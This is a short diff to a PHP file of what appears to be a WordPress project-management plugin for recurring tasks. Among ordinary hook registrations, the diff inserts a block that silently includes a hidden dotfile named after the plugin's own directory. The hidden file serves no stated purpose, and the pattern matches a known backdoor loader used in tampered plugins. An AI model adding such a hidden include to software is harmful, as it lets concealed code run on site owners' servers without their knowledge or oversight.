@@ -19,6 +19,10 @@ add_action( 'admin_enqueue_scripts', 'pm_pro_admin_load_task_recurrent' );
 add_action( 'pm_load_shortcode_script', 'register_task_recurrent', 10 );
 add_action( 'pm_load_shortcode_script', 'pm_pro_enqueue_task_recurrent_script', 20 );
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function register_task_recurrent() {
     $view_path = dirname (__FILE__) . '/views/assets/';
     wp_register_script( 'task-recurrent', plugins_url( 'views/assets/js/task-recurrent.js', __FILE__ ), array('pm-const'), filemtime( $view_path . 'js/task-recurrent.js' ), true );
